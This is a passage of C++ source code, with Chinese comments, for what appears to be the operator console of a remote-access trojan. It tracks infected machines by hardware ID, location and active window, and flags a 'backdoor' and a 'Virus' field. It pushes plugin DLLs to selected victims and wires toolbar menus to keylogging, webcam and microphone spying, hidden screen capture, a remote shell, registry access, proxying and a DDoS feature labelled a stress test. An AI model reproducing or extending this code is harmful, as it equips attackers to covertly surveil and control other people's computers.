				CString addr = g_pFrame->m_gQQwry->IPtoAdd(pContext->szAddress);
				memcpy(LoginInfo->addr, addr.GetBuffer(), (min(addr.GetLength(), 19) * 2) + 2);
				str += LoginInfo->addr;
			}
			else
				str += _T("无IP数据库");
			str += _T(" \nLAN:");
			str += LoginInfo->N_ip;
			MainAddItem(pRecord, str, -1);							//添加项->  位置-延迟-ip

			pContext->Item_cmp_old_IsActive = MainAddItem(pRecord, LoginInfo->UserActive, -1);				//添加项-> 状态   操作 

			pContext->Item_cmp_old_winodow = MainAddItem(pRecord, LoginInfo->Window, -1);					//添加项-> 活动窗口

			MainAddItem(pRecord, LoginInfo->OsName, -1);													//添加项-> 系统    hwid

			MainAddItem(pRecord, LoginInfo->ExeAndOs, -1);// ->SetTooltip(LoginInfo->szHWID);				//添加项-> 客户端位数 系统位数 绑定HWID

			CXTPReportRecordItem* WebCamItem = MainAddItem(pRecord, LoginInfo->IsWebCam, -1);				//添加项-> 视频

			LoginInfo->backdoor ? WebCamItem->SetBackgroundColor(RGB(7, 254, 254)) : WebCamItem->SetBackgroundColor(4294967295);

			MainAddItem(pRecord, LoginInfo->Chat, -1);					//添加项-> 在线QQ

			MainAddItem(pRecord, LoginInfo->Remark, -1);//->SetTooltip(LoginInfo->Version);					//添加项-> 备注

			MainAddItem(pRecord, (pContext->switchsocket == tcp) ? _T("TCP") : _T("UDP"), -1); //添加项-> 方式

			str.Format(_T("%d"), pContext->m_port);
			MainAddItem(pRecord, str.GetBuffer(), -1);						//添加项-> 端口

			MainAddItem(pRecord, LoginInfo->Process, -1);									//添加项->自身进程ID 当前用户

			pContext->Item_cmp_old_m_Time = MainAddItem(pRecord, LoginInfo->m_Time, -1);						//添加项-> 上线时间

			////////////////////////////////////////提示音//////////////////////////////////////////////// 

			g_pLogView->InsertLogItem(_T("上线"), LoginInfo->ip, LoginInfo->addr, LoginInfo->CptName, LoginInfo->OSVersion, LoginInfo->Group, LoginInfo->Remark, LoginInfo->Virus);
			BYTE	bToken = TOKEN_ACTIVED;
			g_pSocketBase->Send(pContext, (LPBYTE)&bToken, sizeof(bToken));


			// save top row
			if (wndReport->GetRows())
				m_pTopRow = wndReport->GetRows()->GetAt(wndReport->GetTopRowIndex());

			// add record
			wndReport->AddRecordEx(pRecord);

			// restore top row
			if (m_pTopRow)
				wndReport->SetTopRow(m_pTopRow->GetIndex());
			wndReport->RedrawControl();

			wndReport->AdjustScrollBars();
			TRACE("数量 %d \n", m_ClienListDate.size());
	

		}
	}
	catch (...) {}
	g_pTabView->UpDateNumber();
	g_pFrame->ShowConnects();
	if (pContext->LoginInfo)
		memcpy(pContext->LoginInfo, LoginInfo, sizeof(LOGININFO));
	
	return 0;
}



//普下线处理
afx_msg LRESULT CQuickView::OnRemoveFromList(WPARAM wParam, LPARAM lParam)
{
	OUT_PUT_FUNCION_NAME_INFO
	LOGININFO* LoginInfo = (LOGININFO*)lParam;
	CCriSecLock recvlock(m_clcs);
	TRACE("OnRemoveFromList %d  \n", LoginInfo);
	it = m_ClienListDate.find(LoginInfo->szHWID);
	if (it != m_ClienListDate.end())
	{
		CXTPReportRecord* pRecord_old = (CXTPReportRecord*)(it->second);
		g_pLogView->InsertLogItem(_T("离线"), LoginInfo->ip, LoginInfo->addr, LoginInfo->CptName, LoginInfo->OSVersion, LoginInfo->Group, LoginInfo->Remark,  LoginInfo->Virus);
		pRecord_old->RemoveAll();
		wndReport->RemoveRecordEx(pRecord_old);
		m_ClienListDate.erase(it);
		((CQuickApp*)AfxGetApp())->ChangeOSnum(LoginInfo->OSVersion, false);
		g_pTabView->UpDateNumber();
		g_pFrame->ShowConnects();
	}
	SAFE_DELETE(LoginInfo);
	return 0;
}




//选中列表项发送命令
void CQuickView::SendSelectCommand(PBYTE pData, UINT nSize)
{
	OUT_PUT_FUNCION_NAME_INFO
		CXTPReportSelectedRows* selerows = wndReport->GetSelectedRows();
	int nCnt = selerows->GetCount();
	CString csCompare, C_TMP_OLD, C_TMP;
	for (int Tmpi = 0; Tmpi < nCnt; Tmpi++)
	{
		CXTPReportRow* pRow_old = selerows->GetAt(Tmpi);
		if (pRow_old->IsGroupRow()) continue;
		CXTPReportRecordItem* Item_cmp_old = pRow_old->GetRecord()->GetItem(0);
		ClientContext* pContext = (ClientContext*)Item_cmp_old->GetItemData();
		if (pContext)
			g_pSocketBase->Send(pContext, pData, nSize);
	}
}


void CQuickView::SendDll(LPCTSTR lpDllName, SENDTASK sendtask)
{
	OUT_PUT_FUNCION_NAME_INFO
		CXTPReportSelectedRows* selerows = wndReport->GetSelectedRows();
	int nCnt = selerows->GetCount();
	if (nCnt < 1)
	{
		log_警告("没有选择发送成员");
		return;
	}
	for (int Tmpi = 0; Tmpi < nCnt; Tmpi++)
	{
		CXTPReportRow* pRow_old = selerows->GetAt(Tmpi);
		if (pRow_old->IsGroupRow()) continue;
		CXTPReportRecordItem* Item_cmp_old = pRow_old->GetRecord()->GetItem(0);
		ClientContext* pContext = (ClientContext*)Item_cmp_old->GetItemData();
		if (pContext)
		{
			CString strDllName = lpDllName;
			strDllName.Format(_T("%s.dll"), lpDllName);
			int	nPacketLength = 1 + sizeof(DllSendDate);
			LPBYTE	lpPacket = new BYTE[nPacketLength];
			memset(lpPacket, 0, nPacketLength);
			lpPacket[0] = COMMAND_DLLMAIN;
			DllSendDate DllDate;
			ZeroMemory(&DllDate, sizeof(DllSendDate));
			DllDate.sendtask = sendtask;
			g_pFrame->GetPluginVersion(strDllName.GetBuffer(), DllDate.szVersion, sendtask, pContext->bisx86);
			_tcscpy_s(DllDate.DllName, strDllName.GetBuffer());
			::memcpy(lpPacket + 1, &DllDate, sizeof(DllSendDate));
			g_pSocketBase->Send(pContext, lpPacket, nPacketLength);
			delete[] lpPacket;
		}
	}
}


void CQuickView::Clipboard(CString csClipboard)
{
	do
	{
		if (!OpenClipboard()) break;
		if (!EmptyClipboard()) break;
		HGLOBAL hClipboardData = NULL;
		size_t sLen = csClipboard.GetLength() * sizeof(TCHAR);
		hClipboardData = GlobalAlloc(GMEM_DDESHARE, (sLen + 1) * sizeof(wchar_t));
		if (!hClipboardData) break;
		wchar_t* pchData = (wchar_t*)GlobalLock(hClipboardData);
		if (!pchData) break;
		wcscpy_s(pchData, sLen + 1, csClipboard.GetBuffer());
		if (!GlobalUnlock(hClipboardData)) break;
		if (SetClipboardData(CF_UNICODETEXT, hClipboardData)) break;
	} while (0);
	CloseClipboard();
}


//////////////////////////顶部TOOLBAR菜单



void CQuickView::OnMenuitemADDMONITOR()		//加入监控
{
	HandlingRightClickMessages(MENU_加入监控);
}



void CQuickView::OnMenuitemKE()		//客户管理
{
	CPoint	p;
	GetCursorPos(&p);
	int nMenuResult = CXTPCommandBars::TrackPopupMenu(&mListmeau_khd, TPM_LEFTALIGN | TPM_RIGHTBUTTON | TPM_RETURNCMD, p.x, p.y, this, NULL);
	if (!nMenuResult) 	return;
	HandlingRightClickMessages(nMenuResult);
}

void CQuickView::OnMenuitemDIAN()		//电源
{
	CPoint	p;
	GetCursorPos(&p);
	int nMenuResult = CXTPCommandBars::TrackPopupMenu(&mListmeau_hh, TPM_LEFTALIGN | TPM_RIGHTBUTTON | TPM_RETURNCMD, p.x, p.y, this, NULL);
	if (!nMenuResult) 	return;
	HandlingRightClickMessages(nMenuResult);
}


void CQuickView::OnMenuitemCHA()		//插件
{
	CPoint	p;
	GetCursorPos(&p);
	//更新插件加载菜单

	p_ReportSelectedRows = wndReport->GetSelectedRows();



	i_mListmeau_other_num = mListmeau_other.GetMenuItemCount();

	for (int i = 0; i < i_mListmeau_other_num; i++)
	{
		mListmeau_other.DeleteMenu(i_mListmeau_other_num - i - 1, MF_BYPOSITION);
	}

	int nItemIndex = 60001;

	typedef std::map<CString, CMenu*> PCMenuDate;
	PCMenuDate m_PCMenuDate;

	int counts = g_pCPlugView->m_pPlugList->GetItemCount();
	for (int i = 0; i < counts; i++)
	{
		CString Groupname = g_pCPlugView->m_pPlugList->GetItemText(i, 7);
		PCMenuDate::iterator iter = m_PCMenuDate.find(Groupname);
		if (iter != m_PCMenuDate.end())
		{
			CString itemname = g_pCPlugView->m_pPlugList->GetItemText(i, 3);
			int nLength = itemname.GetLength();
			if (nLength >= 4)	itemname = itemname.Left(nLength - 4);
			iter->second->AppendMenu(MF_STRING | MF_ENABLED, nItemIndex++, itemname);
		}
		else
		{
			CMenu* pmenu = new CMenu;
			pmenu->CreatePopupMenu();
			mListmeau_other.InsertMenu(60, MF_BYPOSITION | MF_POPUP | MF_STRING, (UINT)pmenu->m_hMenu, Groupname);
			m_PCMenuDate.insert(MAKE_PAIR(PCMenuDate, Groupname, pmenu));
			CString itemname = g_pCPlugView->m_pPlugList->GetItemText(i, 3);
			int nLength = itemname.GetLength();
			if (nLength >= 4)	itemname = itemname.Left(nLength - 4);
			pmenu->AppendMenu(MF_STRING | MF_ENABLED, nItemIndex++, itemname);
		}
	}

	int nMenuResult = CXTPCommandBars::TrackPopupMenu(&mListmeau_other, TPM_LEFTALIGN | TPM_RIGHTBUTTON | TPM_RETURNCMD, p.x, p.y, this, NULL);
	if (!nMenuResult) 	return;
	HandlingRightClickMessages(nMenuResult);
}

void CQuickView::OnMenuitemDDOS()		//压力测试
{
	HandlingRightClickMessages(MENU_压力测试);
}

void CQuickView::OnMenuitemFENZU()		//修改分组
{
	HandlingRightClickMessages(MENU_修改分组);
}

void CQuickView::OnMenuitemBEIZHU()		//修改备注
{
	HandlingRightClickMessages(MENU_修改备注);
}

void CQuickView::OnMenuitemFILE() 			//文件管理
{
	HandlingRightClickMessages(MENU_文件管理);
}

void CQuickView::OnMenuitemDIFSCREEN() 		//差异屏幕
{
	HandlingRightClickMessages(MENU_差异屏幕);
}
void CQuickView::OnMenuitemQUICKSCREEN() 	//高速屏幕
{
	HandlingRightClickMessages(MENU_高速屏幕);
}

void CQuickView::OnMenuitemPLAY() 			//娱乐屏幕
{
	HandlingRightClickMessages(MENU_娱乐屏幕);
}

void CQuickView::OnMenuitemHIDESCREEN() 	//后台屏幕
{
	HandlingRightClickMessages(MENU_后台屏幕);
}

void CQuickView::OnMenuitemSPEAK() 		//播放监听
{
	HandlingRightClickMessages(MENU_播放监听);
}
void CQuickView::OnMenuitemAUDIO() 		//语音监听
{
	HandlingRightClickMessages(MENU_语音监听);
}
void CQuickView::OnMenuitemWEBCAM() 		//视频查看
{
	HandlingRightClickMessages(MENU_视频查看);
}

void CQuickView::OnMenuitemXITONG() 		//系统管理
{
	HandlingRightClickMessages(MENU_系统管理);
}

void CQuickView::OnMenuitemCMD() 			//远程终端
{
	HandlingRightClickMessages(MENU_远程终端);
}
void CQuickView::OnMenuitemKEYBOARD() 		//键盘记录
{
	HandlingRightClickMessages(MENU_键盘记录);
}
void CQuickView::OnMenuitemREGEDIT() 		//查注册表
{
	HandlingRightClickMessages(MENU_查注册表);
}
void CQuickView::OnMenuitemPROXY() 		//代理映射
{
	HandlingRightClickMessages(MENU_代理映射);
}
void CQuickView::OnMenuitemCHAT() 		//远程交谈
{
	HandlingRightClickMessages(MENU_远程交谈);
}







































































































//////////////////////////////////////////////////////////////////////////
// CMessageRecordItemCheck

CMessageRecordItemCheck::CMessageRecordItemCheck(BOOL bCheck)
{
	HasCheckbox(TRUE);
	SetChecked(bCheck);
}

int CMessageRecordItemCheck::GetGroupCaptionID(CXTPReportColumn* /*pColumn*/)
{
	return IsChecked();
}

int CMessageRecordItemCheck::Compare(CXTPReportColumn* /*pColumn*/, CXTPReportRecordItem* pItem)
{
	return int(IsChecked()) - int(pItem->IsChecked());

}
